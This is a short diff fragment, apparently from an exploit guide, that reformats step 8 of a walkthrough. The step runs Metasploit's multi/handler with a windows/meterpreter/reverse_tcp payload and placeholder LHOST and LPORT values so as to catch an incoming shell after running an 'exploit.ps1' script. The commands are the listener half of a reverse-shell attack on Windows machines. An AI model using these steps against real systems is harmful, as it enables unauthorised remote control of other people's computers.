@@ -31,8 +31,13 @@ powershell ./exploit.ps1
 8. Listen for the incoming shell using Metasploit:
 
 msfconsole
+
 use exploit/multi/handler
+
 set PAYLOAD windows/meterpreter/reverse_tcp
+
 set LHOST <your_ip>
+
 set LPORT <port_you_listen>
+
 run
